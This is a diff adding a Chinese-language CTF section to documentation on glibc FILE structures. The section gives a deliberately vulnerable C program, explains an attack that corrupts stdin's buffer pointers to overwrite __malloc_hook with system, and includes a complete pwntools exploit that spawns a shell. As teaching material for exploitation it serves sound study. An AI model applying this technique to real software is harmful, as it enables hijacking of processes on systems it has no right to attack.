@@ -463,3 +463,145 @@ Found FILE * at 0x7f64e53f85c0, fd is 2
 Found FILE * at 0x7f64e53f86a0, fd is 1
 Found FILE * at 0x7f64e53f7980, fd is 0
 ```
+
+## CTF
+
+下面演示如何利用一个任意地址的两字节写，在一个可以操控的 getchar/scanf 调用且外加可控 size 的 malloc 的程序中实现 get shell：
+
+被攻击的程序：
+
+```c
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep
+  // _IO_2_1_stdin_
+  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;
+
+  // unbuffered i/o: _IO_buf_base points to _shortbuf
+  setvbuf(stdin, NULL, _IONBF, 0);
+  setvbuf(stdout, NULL, _IONBF, 0);
+  setvbuf(stderr, NULL, _IONBF, 0);
+
+  // leak address to ease attack
+  printf("libc base is at %p\n", libc_base);
+
+  int num_actions = 0;
+  printf("input number of actions:\n");
+  scanf("%d", &num_actions);
+  printf("input actions (1 for echo, 2 for random write):\n");
+  int *actions = (int *)malloc(sizeof(int) * num_actions);
+  for (int i = 0; i < num_actions; i++) {
+    scanf("%d", &actions[i]);
+  }
+  size_t malloc_size;
+  printf("input malloc size:\n");
+  scanf("%zu", &malloc_size);
+
+  for (int i = 0; i < num_actions; i++) {
+    int action = actions[i];
+    printf("action is %d\n", action);
+    printf("read remain size is %ld\n",
+           stdin->_IO_read_end - stdin->_IO_read_ptr);
+    printf("buffer from %p to %p\n", stdin->_IO_buf_base, stdin->_IO_buf_end);
+    if (action == 1) {
+      // echo
+      int ch = getchar();
+      printf("echo: %d\n", ch);
+    } else if (action == 2) {
+      uint16_t *addr;
+      unsigned int data;
+      printf("input address and data:\n");
+      if (scanf("%p%d", &addr, &data) != 2) {
+        printf("invalid input\n");
+        continue;
+      }
+
+      data = (uint16_t)data;
+
+      printf("write #%d: write 0x%x to %p\n", i, data, addr);
+      *addr = data;
+    }
+  }
+
+  // trigger system("/bin/sh")
+  void *p = malloc(malloc_size);
+  return 0;
+}
+```
+
+它首先读取一系列的操作和最后 malloc 的 size，然后按照操作调用 getchar 或者 scanf，其中 scanf 得到的地址可以对任意地址进行两字节的写。对应的利用过程如下：
+
+1. 为了简单，程序直接把 libc 的 base 打印了出来，假设攻击者已经获取到了 libc 的基地址
+2. 根据任意地址两字节写，把 stdin 的 _IO_buf_base 指向它自己也就是 `&_IO_buf_base`（初始情况下，它指向 `_IO_2_1_stdin` 的 `_shortbuf` 字段，和 `&_IO_buf_base` 只有最低两字节不同）
+3. 利用 `scanf` 触发 `read(fd, _IO_buf_base, _IO_buf_end - _IO_buf_size)` 系统调用，往 `&_IO_buf_base` 写入 16 字节数据，覆盖掉 `_IO_buf_base` 和 `_IO_buf_end` 的取值：设置 `_IO_buf_base` 为 `__malloc_hook`，设置 `_IO_buf_end` 为 `__malloc_hook + 8`，保证 `_IO_buf_base < _IO_buf_end`
+4. 上一次调用过后，`_IO_read_ptr` 等于 `&_IO_buf_base`，`_IO_read_end` 等于 `_IO_read_ptr + 16`；调用 16 次 getchar，使得 `_IO_read_ptr == _IO_read_end`
+5. 利用 `scanf` 再次触发 `read(fd, _IO_buf_base, _IO_buf_end - _IO_buf_size)` 系统调用 ，往 `_IO_buf_base` 也就是 `__malloc_hook` 写入 8 字节数据：设置 `__malloc_hook` 为 `system`
+6. 最后利用已有的 `malloc(size)` 调用，把 `size` 设置为 `/bin/sh` 字符串的地址，由于 `__malloc_hook` 此时已经指向了 `system`，所以 `malloc("/bin/sh")` 会调用 `system("/bin/sh")` 实现 get shell
+
+利用代码如下：
+
+```py
+from pwn import *
+
+context(os="linux", arch="amd64", log_level="debug", terminal=["tmux", "splitw", "-h"])
+p = process("./random_write")
+
+# read libc base address from the program
+line = p.recvline().decode("utf-8")
+libc_base = int(line.split(" ")[-1], 16)
+
+# prepare actions:
+# step 1(["2"]): override _IO_buf_base to point to itself
+# step 2(["2"]): override _IO_buf_base to point to __malloc_hook and _IO_buf_end to __malloc_hook+8
+# step 3(["1"]*16): increment _IO_read_ptr until it equals to _IO_read_end
+# step 4(["2"]): trigger sys_read to write one_gadget to __malloc_hook variable
+p.recvuntil(b"input number of action")
+actions = ["2"] + ["2"] + ["1"] * 16 + ["2"]
+p.sendline(f"{len(actions)}".encode("utf-8"))
+p.recvuntil(b"input actions")
+p.sendline(" ".join(actions).encode("utf-8"))
+
+# send address of "/bin/sh" as malloc size
+# obtained by decompiling system()
+p.recvuntil(b"input malloc size")
+bin_sh = libc_base + 0x1B45BD
+p.sendline(f"{bin_sh}".encode("utf-8"))
+
+# initially _IO_buf_base points to stdin._shortbuf,
+# which is stdin + 0x83, i.e. libc_base + 0x1ECA03.
+# override the lowest two bytes of stdin._IO_buf_base to 0xC9B8
+# then _IO_buf_base points to libc_base + 0x1EC9B8, which is _IO_buf_base itself
+# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep __IO_2_1_stdin
+stdin = libc_base + 0x1EC980
+stdin_io_buf_base = stdin + 0x38  # offsetof(struct _IO_FILE, _IO_buf_base)
+p.recvuntil(b"input address and data")
+p.sendline(f"0x{stdin_io_buf_base:x} {stdin_io_buf_base & 0xFFFF}".encode("utf-8"))
+
+# now _IO_buf_base points to itself,
+# write __malloc_hook to _IO_buf_base and
+# __malloc_hook+8 to _IO_buf_end.
+# this is required _IO_buf_base must be smaller than _IO_buf_end.
+# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep malloc_hook
+malloc_hook = libc_base + 0x1ECB70
+p.recvuntil(b"input address and data")
+p.send(p64(malloc_hook) + p64(malloc_hook + 8))
+
+# now _IO_read_ptr points to libc_base + 0x1EC9B8,
+# _IO_read_end points to libc_base + 0x1EC9C8,
+# we want them to become equal to read more data into _IO_buf_base,
+# the _IO_read_ptr pointer is incremented 16 times via getchar().
+
+# override __malloc_hook to system
+# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system
+system = libc_base + 0x52290
+p.recvuntil(b"input address and data")
+p.sendline(p64(system))
+
+# waiting for shell
+p.sendline(b"whoami && id")
+p.interactive()
+```
